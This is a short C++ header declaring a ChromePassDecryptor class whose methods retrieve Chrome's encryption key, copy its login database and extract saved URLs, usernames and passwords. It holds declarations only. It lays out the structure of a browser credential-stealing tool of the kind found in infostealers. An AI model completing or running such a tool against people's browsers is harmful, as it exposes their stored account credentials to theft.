#pragma once
#include "Utils.h"
#include "json.hpp"
#include "sqlite3.h"

using json = nlohmann::json;

struct PasswordEntry
{
	std::string URL;
	std::string Username;
	std::string Password;
};

class ChromePassDecryptor
{
public:
	void Initialize();
	void Run();

	inline const std::string& GetEncryptionKey() const { return m_EncryptionKey; }

	inline std::vector<PasswordEntry>& GetPasswordEntries() { return m_PasswordEntries; }

private:
	std::string m_EncryptionKey = "";
	void RetrieveEncryptionKey();

private:
	std::vector<PasswordEntry> m_PasswordEntries;

	void CopyDB(const char* source, const char* dest);
	sqlite3* GetDBHandle(const char* dbFilePath);
	void GetPasswords(sqlite3* db);
};
